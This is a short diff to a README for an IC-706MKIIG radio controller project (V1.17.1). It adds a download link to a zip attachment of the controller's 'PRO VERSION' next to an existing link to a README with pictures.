@@ -1,3 +1,4 @@
+[ICOM-IC-706-MK2-CONTROLLER-PRO-VERSION-main.zip](https://github.com/user-attachments/files/33152945/ICOM-IC-706-MK2-CONTROLLER-PRO-VERSION-main.zip)
 [IC706-README-with-pictures.zip](https://github.com/user-attachments/files/33152905/IC706-README-with-pictures.zip)
 HamTech M0FXB IC-706MKIIG Controller V1.17.1
 
